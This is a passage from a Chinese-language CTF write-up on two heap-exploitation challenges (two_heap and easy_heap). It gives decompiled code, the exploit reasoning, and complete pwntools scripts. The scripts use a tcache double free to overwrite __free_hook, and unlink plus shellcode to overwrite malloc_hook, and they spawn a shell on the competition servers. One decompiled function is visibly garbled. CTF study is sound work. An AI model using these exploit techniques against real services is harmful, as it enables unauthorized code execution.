      v4 = (__int64 *)malloc(v3);
      if ( !v4 )
    LABEL_4:
        exit(0);
      puts("Input the note:");
      v5 = &(&off_4020)[2 * v1];
      leak(v4, v3);
      *(_DWORD *)v5 = v3;
      v5[1] = v4;
      return __readfsqword(0x28u) ^ v7;
    }
#### del
删除函数同样是没有对指针置0，漏洞很明显，就是利用起来比较困难了。这里检查了一下idx是否符合要求。
    void sub_15A0()
    {
      __int64 v0; // rax
      unsigned __int64 v1; // [rsp+8h] [rbp-10h]
      v1 = __readfsqword(0x28u);
      puts("Input the index:");
      v0 = (signed int)sub_13E0("Input the index:");
      if ( (unsigned __int64)(signed int)v0 > 7 )
        exit(0);
      if ( __readfsqword(0x28u) == v1 )
        free((&off_4020)[2 * v0 + 1]);
    }
### 思路分析
  1. 首先因为存在printf_chk可以用%a去leak，这里有个小技巧，当得到的是p字符的时候用0去替换掉。然后就可以计算出地址，有了leak的地址就容易的多了
  2. 有了leak利用malloc size = 0x1,0x8,0x10,0x18来进行对size的绕过就可以利用了，说实话这个题比one简单。。
> 感觉这个题目出的可以，都是知识盲区现找现查，学到很多。
### exp:
    from pwn import*
    context.log_level = "debug"
    #p = process("./two_heap",env={"LD_PRELOAD":"./libc-2.26.so"})
    a = ELF("./libc-2.26.so")
    p = remote("47.104.89.129",10002)
    #gdb.attach(p)#,"b *0x5555555554a0")
    def new(size,content):
        p.recvuntil("Your choice:")
        p.sendline("1")
        p.recvuntil("Input the size:")
        p.sendline(str(size))
        p.recvuntil("Input the note:")
        p.sendline(content)
    def remove(idx):
        p.recvuntil("Your choice:")
        p.sendline("2")
        p.recvuntil("Input the index:")
        p.sendline(str(idx))
    def new0(size,content):
        p.recvuntil("Your choice:")
        p.sendline("1")
        p.recvuntil("Input the size:")
        p.sendline(str(size))
        p.recvuntil("Input the note:")
        p.send(content)
    p.recvuntil("Welcome to SCTF:")
    p.sendline("%a"*5)
    p.recvuntil("0x0p+00x0p+00x0.0")
    lib_addr = int(p.recvuntil("p-10220x",drop=True)+"0",16) - a.symbols["_IO_2_1_stdout_"]
    free_hook = a.symbols["__free_hook"]+lib_addr
    system = lib_addr+a.symbols["system"]
    print hex(lib_addr)
    new0(0x1," ")
    remove(0)
    remove(0)
    raw_input()
    new0(0x8,p64(free_hook))
    new0(0x10,"\n")
    new(24,p64(system))
    new(0x60,"/bin/sh\x00")
    remove(4)
    p.interactive()
## easy_heap
这个题主要是在offbynull上，题目如果预期解是house of orange的话这个题就复杂了很多但是其实用unlink解就容易多了。
### 静态分析
#### main
主要实现了功能
    void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
    {
      unsigned int v3; // [rsp+14h] [rbp-Ch]
      unsigned __int64 v4; // [rsp+18h] [rbp-8h]
      v4 = __readfsqword(0x28u);
      v3 = 0;
      sub_CD0();
      while ( 1 )
      {
        while ( 1 )
        {
          menu();
          _isoc99_scanf(&unk_12A8, &v3);
          if ( v3 != 2 )
            break;
          del();
        }
        if ( v3 > 2 )
        {
          if ( v3 == 3 )
          {
            fill();
          }
          else
          {
            if ( v3 == 4 )
              exit(0);
    LABEL_13:
            puts("Invalid choice!");
          }
        }
        else
        {
          if ( v3 != 1 )
            goto LABEL_13;
          add();
        }
      }
    }
#### del
正常的一个删除函数
    int del()
    {
      void *v0; // rax
      unsigned int v2; // [rsp+Ch] [rbp-4h]
      printf("Index: ");
      v2 = sub_EE5();
      if ( v2  0xF || !qword_202060[2 * v1 + 1] )
        return puts("Invalid index.");
      printf("Content: ");
      return input((__int64)qword_202060[2 * v1 + 1], (unsigned __int64)qword_202060[2 * v1]);
    }
### 思路分析
  1. 进行一个unlink控制全局变量，这题还有别的解法就是off by null来unlink或者largebin attack 去控制和写入mmap的内存
  2. 写入mmap内存为shellcode然后利用fastbin attack 改写malloc_hook
> 这里的方法细节是在bss段构造一个fakechunk然后free进入unsortedbin
> 会有libc地址残留在指针处，然后改指针的低位，就可以malloc到需要的地方，然后改malloc_hook为one就可以了。
### exp
    from pwn import*
    context.arch = "amd64"
    context.log_level = "debug"
    #p = process("./easy_heap")#,env={"LD_PRELOAD":"./libc.so.6"})
    a = ELF("./easy_heap")
    e = a.libc
    print hex(e.symbols["puts"])
    p = remote("132.232.100.67",10004)
    #gdb.attach(p)#,"b *0x5555555554a0")
    def add(size):
        p.recvuntil(">> ")
        p.sendline("1")
        p.recvuntil("Size: ")
        p.sendline(str(size))
    def remove(idx):
        p.recvuntil(">> ")
        p.sendline("2")
        p.recvuntil("Index: ")
        p.sendline(str(idx))
    def edit(idx,content):
        p.recvuntil(">> ")
        p.sendline("3")
        p.recvuntil("Index: ")
        p.sendline(str(idx))
        p.recvuntil("Content: ")
        p.sendline(content)
    p.recvuntil("Mmap: ")
    mmap_addr = int(p.recvuntil("\n",drop=True),16)
    print hex(mmap_addr)
    add(0xf8)
    p.recvuntil("Address 0x")
    addr = int(p.recvline().strip(),16) - 0x202068
    add(0xf8)
    add(0x20)
    edit(0,p64(0)+p64(0xf1)+p64(addr+0x202068-0x18)+p64(addr+0x202068-0x10)+"a"*0xd0+p64(0xf0))
    remove(1)
    edit(0,p64(0)*2+p64(0xf8)+p64(addr+0x202078)+p64(0x140)+p64(mmap_addr))
    edit(1,asm(shellcraft.sh()))
    bss_addr = 0x202040
    edit(0,p64(addr+0x202090)+p64(0x20)+p64(0x91)+p64(0)*17+p64(0x21)*5)
    remove(1)
    edit(0,p64(0)*3+p64(0x100)+'\x10')
    edit(3,p64(mmap_addr))
    add(0x20)
    p.interactive()
## 总结
题目感觉还是挺有质量的，就是怪自己手速太慢，没拿到几个血，我tcl，wsl。